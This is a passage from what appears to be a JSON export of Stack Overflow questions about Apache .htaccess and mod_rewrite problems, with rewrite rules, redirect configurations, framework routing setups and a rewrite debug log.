!-d\n    RewriteRule . /index.php [L]\n</code></pre>\n\n<p>However, if I use just <strong>s.cfm?</strong>  everything works fine and redirects to article5.php. But if I try to redirect the id=5 part, I get page not found.</p>\n\n<p>I tried just <strong>s.cfm?id</strong>  and it causes the htaccess bug.  So anything you put after question mark ?... causes a problem, I don't know why.</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":13146889,"title":"Htaccess: How to get Variable form URL?","body":"<p>I do have a question regarding htaccess. I am trying to do the following:</p>\n\n<p><code>blabla.com/lala</code> and <code>blabla.com/lulu</code></p>\n\n<p>lala and lulu are my variables (showing different content on both sites, but it is the same file (example.php).</p>\n\n<p>So what I did in htaccess is:</p>\n\n<pre><code>RewriteRule ^([^&amp;]+)$ example.php?type=$1\n</code></pre>\n\n<p>But when echoing GET[type] I just get the filename(\"example.php\"). But I want it to show \"lala\" or \"lulu\".</p>\n\n<p>It works when I do it like that:</p>\n\n<pre><code>RewriteRule ^blablabla/([^&amp;]+)$ example.php?type=$1\n</code></pre>\n\n<p>But I just don't need \"blablabla\" :D</p>\n\n<p>Thanks in advance :)</p>\n"},{"tags":[".htaccess","font-face"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13146321,"title":"htaccess to block access to font files (used in @font-face) from public","body":"<p>we've got a company font that was designed in house, we want to use it for headings on our website but this causes problems we can either, </p>\n\n<ul>\n<li>have the text as an image and lose any seo benefit </li>\n<li>Use @font-face but then any one could access our font and use it as their own</li>\n<li>Use somthing like cufon </li>\n</ul>\n\n<p>The most appealing out of the above is to use @font-face but i was wandering if id be able to block access to the file using .htaccess, so that the public could not download the font. If i did this would the font still be usable ? ie. would the browser still be able to reference it when it renders the page ?</p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":13145689,"title":"Special characters in mod_rewrite url","body":"<p>I want this URL:</p>\n\n<pre><code>http://www.mydomainblabla.com/s/can+you+drill+shrinky+dinks?.html\n</code></pre>\n\n<p>to be rewritten to this one:</p>\n\n<pre><code>http://www.mydomainblabla.com/search.php?q=can+you+drill+shrinky+dinks?\n</code></pre>\n\n<p>I am using this mod_rewrite rule in my .htaccess to accomplish this</p>\n\n<pre><code>RewriteRule ^s/(.+).html$ search.php?q=$1 [L,QSA]\n</code></pre>\n\n<p>However, the result is not as I want it, when I go to the first url, I get a page not found message.</p>\n\n<p>The same problem occurs when I visit this url:</p>\n\n<pre><code>http://www.mydomainblabla.com/s/http://www.zakgeldnodig.nl/.html\n</code></pre>\n\n<p>which should be rewritten into this one:</p>\n\n<pre><code>http://www.mydomainblabla.com/search.php?q=http://www.zakgeldnodig.nl/\n</code></pre>\n\n<p>What modifications should I make to my .htaccess to make this work?</p>\n"},{"tags":["apache","zend-framework",".htaccess"],"answer_count":3,"favorite_count":3,"up_vote_count":7,"down_vote_count":0,"view_count":8934,"score":7,"question_id":2003101,"title":"Zend and .htaccess","body":"<p>My default 'zend' app has this default structure</p>\n\n<pre><code>/zend + webroot\n    /application\n    /config\n    /library\n    /public\n        .htaccess\n        index.php\n</code></pre>\n\n<p>and the default .htaccess redirects the various controller/action details via ./public/index.php</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ index.php [NC,L]\n</code></pre>\n\n<p>I use this default url to access the app</p>\n\n<pre><code>http://domain/index.php\n</code></pre>\n\n<p>I've now moved to a shared host, where the webroot is above the 'zend' root.</p>\n\n<pre><code>/webroot\n    /zend\n        /application\n        /config\n        /public\n            index.php\n           .htaccess\n</code></pre>\n\n<p>but i can only access my app via this URL</p>\n\n<pre><code>http://domain/zend/public/index.php\n</code></pre>\n\n<p>i want to be able to use</p>\n\n<pre><code>http://domain/zend/index.php\n</code></pre>\n\n<p>and have .htaccess redirect.</p>\n\n<p>and i'm wondering how i can tweak the .htaccess file to redirect the URL requests. I read\nthis <a href=\"http://www.alberton.info/zend_framework_mod_rewrite_shared_hosting.html\">tutorial</a> but i didn;t work for me</p>\n\n<pre><code>/webroot\n    /zend\n        .htaccess\n        /application\n        /config\n        /library\n        /public\n            index.php\n</code></pre>\n\n<p>This is the .htaccess content in this case</p>\n\n<pre><code>RewriteEngine On\n\nRewriteRule ^\\.htaccess$ - [F]\n\nRewriteCond %{REQUEST_URI} =\"\"\nRewriteRule ^.*$ /public/index.php [NC,L]\n\nRewriteCond %{REQUEST_URI} !^/public/.*$\nRewriteRule ^(.*)$ /public/$1\n\nRewriteCond %{REQUEST_FILENAME} -f\nRewriteRule ^.*$ - [NC,L]\n\nRewriteRule ^public/.*$ /public/index.php [NC,L]\n</code></pre>\n\n<p>Can anybody spot anything?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13142820,"title":"rewrite some urls since menu change","body":"<p>I am having trouble getting </p>\n\n<p>site.com/member-videos</p>\n\n<p>into </p>\n\n<p>site.com/videos</p>\n\n<p>or in reality</p>\n\n<pre><code>#RewriteCond %{HTTP_HOST} !^/community/member-videos/\n#RewriteRule (.*) http://site.com/community/videos/$1 [R=301,L]\n</code></pre>\n\n<p>this seems to loop !</p>\n\n<p>for me the above says find the match for '/community/member-videos/' and send anything like that to the url after...I have lost too much time now on this typical I would guess issue and looked at a lot of similar online but nothing quite works for this case..\nthanks</p>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13140982,"title":"Redirecting contents not using HTTP","body":"<p>I would like to have apache respond to server request of the format \"http://url.com/dir/ID\" by directly accessing \"http://url.com/something:PORT\", where the ID is set by the user, and the PORT is determined by the ID (they're not the same value).</p>\n\n<p>I have tried so with \"Redirect\", but this simply sends a HTTP redirect, my goal to to directly feed the contains of \"http://url.com/something:PORT\" to \"http://url.com/dir/ID\".</p>\n\n<p>Is this possible?</p>\n\n<p><strong>EDIT:</strong><br>\nExample:<br>\nThe requester goes to <code>http://url.com/dir/ID</code> and does not get redirected to <code>http://url.com/something:PORT</code> but gets the actual contents of <code>http://url.com/something:PORT</code>as if the original request was to here.</p>\n"},{"tags":["javascript",".htaccess","deep-linking"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13144943,"title":"htaccess and deeplinking back button","body":"<p>I am implementing the following htaccess to deep link into an ajax heavy site,</p>\n\n<p>It works fine except if you link into the site from outside you need to hit the back button twice quickly to go back.</p>\n\n<p>Has anyone tackled this before successfully and if so how ?</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nOptions +FollowSymlinks\nRewriteEngine On\n# Rewrite rules to support deeplinking\nRewriteRule ^([A-Za-z]+)/?$ /studio/$1/ [NC,R]\nRewriteRule ^studio/families/([^/]*)/?$ /studio/inc-discover-static/$1 [NC,NE,R]\nRewriteRule ^studio/([^/]*)/?$ /index.php#!section=$1 [NC,NE,R]\nRewriteRule ^studio/([^/]*)/([^/]*)/?$ /index.php#!section=$1&amp;sub=$2 [NC,NE,R,L]      \n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["php","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13140765,"title":".htaccess strange behavior","body":"<p>I'm currently migrating a Apache2 PHP5 production instance to a local environment.</p>\n\n<p>In the .htaccess file I found the following rewrite-rule:</p>\n\n<pre><code>RewriteRule ^profile/?$ profile.php\n</code></pre>\n\n<p>which is working. However, when trying to access localhost/profile I'm presented with an empty page and this addition to the response header</p>\n\n<pre><code>Content-Location:profile.class.php\n</code></pre>\n\n<p>If I change the rule to anything other than ^profile/?$, say ^profil/?$ everything works.</p>\n\n<p>What can cause this strange behavior, naming collisions, reserved words?</p>\n\n<p>Here is the log from mod_rewrite</p>\n\n<pre><code>% tail -f rewrite.log                          \n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9c00a0/subreq] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.php -&gt; profile.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9c00a0/subreq] (3) [perdir /var/www/] applying pattern '^sign-up/?([a-f0-9]+)?/?([a-f0-9]+)?/?$' to uri 'profile.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9c00a0/subreq] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.php -&gt; profile.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9c00a0/subreq] (3) [perdir /var/www/] applying pattern '^sign-out/?$' to uri 'profile.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9c00a0/subreq] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.php -&gt; profile.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9c00a0/subreq] (3) [perdir /var/www/] applying pattern '^new-app/?(budget)?/?([A-Za-z0-9-]+)?/?$' to uri 'profile.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9c00a0/subreq] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.php -&gt; profile.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9c00a0/subreq] (3) [perdir /var/www/] applying pattern '^profile/([a-f0-9]{50})/?([a-f0-9]{50})?/?' to uri 'profile.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9c00a0/subreq] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.php -&gt; profile.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9c00a0/subreq] (3) [perdir /var/www/] applying pattern '^profile/?([a-z0-9-]+)?/?$' to uri 'profile.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9c00a0/subreq] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.php -&gt; profile.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^sign-in/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^features/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^features/([a-z0-9-]+)/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^terms/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^(all|books|business|education|entertainment|finance|games|healthcare-and-fitness|lifestyle|medical|music|navigation|news|photography|productivity|reference|social-networking|sports|travel|utilities|weather)/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^(books|business|education|entertainment|finance|games|healthcare-and-fitness|lifestyle|medical|music|navigation|news|photography|productivity|reference|social-networking|sports|travel|utilities|weather)/([A-Za-z0-9-]+)/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^(books|business|education|entertainment|finance|games|healthcare-and-fitness|lifestyle|medical|music|navigation|news|photography|productivity|reference|social-networking|sports|travel|utilities|weather)/([A-Za-z0-9-]+)/invite/?([a-z0-9-]+)?/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^(books|business|education|entertainment|finance|games|healthcare-and-fitness|lifestyle|medical|music|navigation|news|photography|productivity|reference|social-networking|sports|travel|utilities|weather)/([A-Za-z0-9-]+)/(app-details|testers|test-reports|test-report|start|update|contact-tester)/?(\\d+)?/?([a-z0-9-]+)?/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^forgot-password/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^connect-with-facebook/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^account/?(confirm-email|reset-password|send-confirmation-link)/?([A-Za-z0-9]+)?/?([_\\.0-9a-zA-Z-%+]+@([0-9a-zA-Z][0-9a-zA-Z-]+\\.)+([a-zA-Z]{2,4}$))?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^public-scripts/?(add-device|propose-projects|generate-mass-payment|edit-device|your-devices|get-app-password|remove-device|beta-test-request|change-project-tester-status|download-udids|download-app|open-report|rate-report|reply|invite-search|invite-user|ignore-invite|uninvite|add-device-over-air|save-device-over-air|send-air-link|search-android-device)/?([A-Za-z0-9]+)?/?([A-Za-z0-9\\.]+)?/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^rss/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/profile.class.php -&gt; profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (3) [perdir /var/www/] applying pattern '^feed/?$' to uri 'profile.class.php'\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9d20a0/initial] (1) [perdir /var/www/] pass through /var/www/profile.class.php\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9cd0a0/initial] (1) [perdir /var/www/] pass through /var/www/favicon.ico\n192.168.0.31 - - [30/Oct/2012:16:18:31 +0100] [192.168.0.40/sid#7f930db80978][rid#7f930d9c12c0/initial/redir#1] (3) [perdir /var/www/] strip per-dir prefix: /var/www/404.php -&gt; 404.php\n</code></pre>\n\n<p>.htaccess</p>\n\n<pre><code>RewriteEngine on\n\nRewriteRule ^sign-up/?([a-f0-9]+)?/?([a-f0-9]+)?/?$ sign-up.php?project_token=$1&amp;invite_token=$2\nRewriteRule ^sign-out/?$ sign-out.php\nRewriteRule ^new-app/?(budget)?/?([A-Za-z0-9-]+)?/?$ new-app.php?stage=$1&amp;app=$2\nRewriteRule ^profile/([a-f0-9]{50})/?([a-f0-9]{50})?/? profile-other.php?token=$1&amp;project=$2\nRewriteRule ^profile/?([a-z0-9-]+)?/?$ profile.php?profile_menu_cat=$1\nRewriteRule ^admin/?([a-z0-9-]+)?/?$ admin.php?profile_menu_cat=$1\nRewriteRule ^faq/?(our-application|for-beta-testers|for-developers)?/?$ faq.php?app_cat=$1\nRewriteRule ^get/?([A-Za-z0-9-]+)/?([a-z0-9]+)\\.?(ipa|plist|apk)?/?$ download.php?url=$1&amp;token=$2&amp;$3\nRewriteRule ^contact/?$ contact.php\nRewriteRule ^sign-in/?$ sign-in.php\nRewriteRule ^features/?$ features.php\nRewriteRule ^features/([a-z0-9-]+)/?$ features.php?sub=$1\nRewriteRule ^terms/?$ terms.php\nRewriteRule ^(all|books|business|education|entertainment|finance|games|healthcare-and-fitness|lifestyle|medical|music|navigation|news|photography|productivity|reference|social-networking|sports|travel|utilities|weather)/?$ browse.php?category=$1\n\nRewriteRule ^(books|business|education|entertainment|finance|games|healthcare-and-fitness|lifestyle|medical|music|navigation|news|photography|productivity|reference|social-networking|sports|travel|utilities|weather)/([A-Za-z0-9-]+)/?$ app.php?category=$1&amp;app=$2&amp;app_cat=$3&amp;extra=$4\n\nRewriteRule ^(books|business|education|entertainment|finance|games|healthcare-and-fitness|lifestyle|medical|music|navigation|news|photography|productivity|reference|social-networking|sports|travel|utilities|weather)/([A-Za-z0-9-]+)/invite/?([a-z0-9-]+)?/?$ invite.php?category=$1&amp;app=$2&amp;app_cat=invite&amp;extra=$4\n\nRewriteRule ^(books|business|education|entertainment|finance|games|healthcare-and-fitness|lifestyle|medical|music|navigation|news|photography|productivity|reference|social-networking|sports|travel|utilities|weather)/([A-Za-z0-9-]+)/(app-details|testers|test-reports|test-report|start|update|contact-tester)/?(\\d+)?/?([a-z0-9-]+)?/?$ app.php?category=$1&amp;app=$2&amp;app_cat=$3&amp;extra=$5&amp;version=$4\n\nRewriteRule ^forgot-password/?$ forgot-password.php\nRewriteRule ^connect-with-facebook/?$ connect-with-facebook.php\nRewriteRule ^account/?(confirm-email|reset-password|send-confirmation-link)/?([A-Za-z0-9]+)?/?([_\\.0-9a-zA-Z-%+]+@([0-9a-zA-Z][0-9a-zA-Z-]+\\.)+([a-zA-Z]{2,4}$))?$ account.php?1=$1&amp;2=$2&amp;3=$3\nRewriteRule ^public-scripts/?(add-device|propose-projects|generate-mass-payment|edit-device|your-devices|get-app-password|remove-device|beta-test-request|change-project-tester-status|download-udids|download-app|open-report|rate-report|reply|invite-search|invite-user|ignore-invite|uninvite|add-device-over-air|save-device-over-air|send-air-link|search-android-device)/?([A-Za-z0-9]+)?/?([A-Za-z0-9\\.]+)?/?$ public-scripts.php?1=$1&amp;2=$2&amp;3=$3\nRewriteRule ^rss/?$ rss.php\nRewriteRule ^feed/?$ rss.php\n\nErrorDocument 404 /404.php\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":8,"score":2,"question_id":13143525,"title":"Change destination file using htaccess","body":"<p>I have an image created with php.</p>\n\n<pre><code>&lt;img src=\"captcha.php\" /&gt;\n</code></pre>\n\n<p>How can i put this captcha.php in some folder (inc), but the src=\"captcha.php\" stay as it is.</p>\n\n<p>I think htaccess maybe can do that.</p>\n\n<p>Some help please ?</p>\n\n<p>Thanks.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13141404,"title":".htaccess RewriteRule giving 500 server error","body":"<p>I have a rewrite rule as follows:</p>\n\n<pre><code>RewriteRule ^equipment /equipment.php [L]\n</code></pre>\n\n<p>It will throw a 500 server error... but if I were to replace the <code>equipment.php</code> with, for example, our contact page <code>contactUs.php</code> it will redirect to the contact page with no problems.</p>\n\n<p>I have other rewrite rules that work fine - but I can't figure out why this won't work.</p>\n"}]}
{"total":14527,"page":4,"pagesize":100,"questions":[{"tags":[".htaccess","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13142666,"title":".htaccess redirect to specific path if the ip does not match","body":"<p>I have almost the same following structure on my server:</p>\n\n<pre><code>               root\n                |\n          1-----2-----3\n          |     |     \n          4     5\n                |\n                6\n</code></pre>\n\n<p>So I was wondering whether I could put only one .htaccess file in the root directory to control if the IP address is not mine to redirect from 1, 2, 3, 4 and 5th directory to the 6th one ?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":15,"score":-3,"question_id":13141837,"title":".htaccess rewrite complete path w/ all files (no redirect)","body":"<p>I want to rewrite a directory to another directory. The file/link structure to all files (like css/js/images/GET vars etc.) have to keep intact.</p>\n\n<p>My files currently are in <strong>http://www.example.org/_directory1/output/index.php?site=site1</strong></p>\n\n<p>The new path should be <strong>http://www.example.org/newDir/index.php?site=site1</strong></p>\n\n<p>In a nutshell /_directory1/output/ should changed to /newDir/.</p>\n"},{"tags":[".htaccess","url-rewriting","kohana","kohana-3","kohana-3.2"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13127345,"title":"Kohana rewriting urls in .htaccess showing file not found message","body":"<p>I'm using Kohana 3.2 framework, I've put the standard .htaccess file in the same folder of the aplication.</p>\n\n<p>my .htaccess file is</p>\n\n<pre><code># Turn on URL rewriting\nRewriteEngine On\n\n# Installation directory\nRewriteBase /mysite/\n\n# Protect hidden files from being viewed\n&lt;Files .*&gt;\n        Order Deny,Allow\n        Deny From All\n&lt;/Files&gt;\n\n# Protect application and system files from being viewed\nRewriteRule ^(?:application|modules|system)\\b.* index.php/$0 [L]\n\n# Allow any files or directories that exist to be displayed directly\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\n# Rewrite all other URLs to index.php/URL\nRewriteRule ^(.*)$ /index.php/$0 [PT]\n</code></pre>\n\n<p>I've tried changing the las line to</p>\n\n<pre><code>RewriteRule ^(.*)$ /index.php/$0\nRewriteRule ^(.*)$ /index.php/$0 [PT,L]\nRewriteRule ^(.*)$ /index.php/$0 [PT,L,QSA]\nRewriteRule .* /index.php/$0 [PT]  -  [PT,L]  -  [PT,L,QSA]\n</code></pre>\n\n<p>But it still shows</p>\n\n<blockquote>\n  <p>Not Found</p>\n  \n  <p>The requested URL /index.php/login was not found on this server.</p>\n</blockquote>\n\n<pre><code>The complete path of the app is /var/www/es/ec/mysite\n\nThe complete working URL is http://10.0.0.1/ec/mysite/index.php/login\n\nThe complete NOT working URL is http://10.0.0.1/ec/mysite/login\n</code></pre>\n\n<p>Also...</p>\n\n<pre><code>Running in Apache 2.2.3 over CentOS 5\n</code></pre>\n\n<p>Any idea???</p>\n"},{"tags":[".htaccess","drupal","drupal-6"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":276,"score":0,"question_id":8799591,"title":"301 Redirect old site URL's in new Drupal installation","body":"<p>I'm looking to 301 redirect an URL from a old version of a site no longer being used to a new URL that has been created in fresh Drupal installation.</p>\n\n<p>Old URL: /198/our-software/</p>\n\n<p>New URL: /services/software-development/</p>\n\n<p>In the .htaccess located in the root directory of Drupal I have added the following:</p>\n\n<pre><code>redirect 301 /198/our-software/ http://www.domain.com/services/software-development\n</code></pre>\n\n<p>The redirect is working to some extent, it sends the user to a url like below with a query string appended to the end of it, which results in a 404 error:</p>\n\n<p><a href=\"http://www.domain.com/services/software-development?q=198/our-software/\" rel=\"nofollow\">http://www.domain.com/services/software-development?q=198/our-software/</a>  </p>\n\n<p>I have tried placing the redirect at both the start and end of the .htaccess file both result in a 404 page not found error.</p>\n\n<p>Do I need to use a more complex redirect to get around Drupals URL rewrite?</p>\n\n<p>NOTE: I'm using the Pathauto module.</p>\n"},{"tags":[".htaccess","redirect","joomla"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":13132722,"title":"Percentage (%) in the joomla blog post url breaking site","body":"<p>Anyone know how to redirect </p>\n\n<blockquote>\n  <p>domain/blog/208-%-top.html</p>\n</blockquote>\n\n<p>To: </p>\n\n<blockquote>\n  <p>domain/blog/208-top.html</p>\n</blockquote>\n\n<p>in Joomla?</p>\n\n<p>None of the below works:</p>\n\n<pre><code>RewriteRule ^blog/208-%-top.html$ 208-top.html [R=301,L]\nRewriteRule ^blog/208-\\%-top.html$ 208-top.html [R=301,L]\nRewriteRule ^blog/208-.*-top.html$ 208-top.html [R=301,L]\n</code></pre>\n\n<p>It works if: url has %20 or %25 and have below in htaccess</p>\n\n<pre><code>RewriteRule ^blog/208-%20-top.html$ 208-top.html [R=301,L]\nRewriteRule ^blog/208-%25-top.html$ 208-top.html [R=301,L]\n</code></pre>\n\n<p>But the problem is blog post has % only. Is there any work around to fix this?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13137322,"title":"mod_rewrite for different URL","body":"<p>Is there a way we can use mod_rewrite on .htaccess file to get different url with folder and any character/numbers match so that it only changes if access via</p>\n\n<p>/files/ to othersite.com/files/^(.*)$</p>\n\n<p>Something like above?</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13136941,"title":"htaccess block access except for one useragent","body":"<p>I have a directory on my server which has content located in it which I do not want to be browseable - I originally blocked index access using htaccess, the name of the folder is totally randomised and access to content located within the folder is currently via a script which serves the content up without the user ever know the actual location.</p>\n\n<p>I am now using an indexer to allow me to index the contents to make the files searchable but this htaccess code is blocking the indexer from accessing the folder (which is what it should do I guess!):</p>\n\n<pre><code>Options All -Indexes\nErrorDocument 404 /hr/index\nErrorDocument 403 /hr/index\n</code></pre>\n\n<p>Is is possible to make a directory and all subdirectories under it inaccessible to anything other than the view script and this indexer ONLY?</p>\n\n<p>Thanks</p>\n"},{"tags":["jquery","ajax",".htaccess","request"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":13136331,"title":"Limit access using ajax and .htaccess","body":"<p>I'va got a jquery file processing some mysql-data changes using ajax-calls (jQuery api) within php handler file.</p>\n\n<p>This is my javascript:</p>\n\n<pre><code>$('#control1').click(function() {\n    